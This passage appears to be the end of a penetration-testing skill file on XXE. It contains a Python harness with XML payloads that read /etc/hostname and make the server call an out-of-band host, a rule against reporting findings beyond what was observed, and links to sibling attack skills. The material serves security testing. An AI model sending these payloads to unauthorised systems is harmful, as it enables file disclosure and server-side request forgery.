 ("external-entity",f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://{SUB}/">]><r><a>&x;</a></r>'),
 ("file-read",      '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r><a>&x;</a></r>'),
]
for n,b in cases:
    c,r=post(b)
    print(f"{n:16} status={c} size={len(r):6} marker={'MKR' in r}")
print()
print("check " + SUB + " - a request arriving there is the confirmation for the external-entity case")
print("report the LOWEST numbered step that produced a positive result, with its raw response")
PY
```

**Stop at the first positive step.** An internal-entity success with an external-entity failure is a
different finding from full XXE, and reporting the latter when you observed the former is a
fabrication.

---

## 24. RELATED SIBLINGS - LOAD TOGETHER
- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) - the same outbound request, reached through any parser
- [xslt-injection](../xslt-injection/SKILL.md) - the neighbouring XML-processing class that reaches code execution
- [upload-insecure-files](../upload-insecure-files/SKILL.md) - the entry point an SVG or Office XXE needs
- [deserialization-insecure](../deserialization-insecure/SKILL.md) - the other class that begins at a request body and ends at code
- [csp-bypass-advanced](../csp-bypass-advanced/SKILL.md) - the client-side context when an SVG reaches a browser
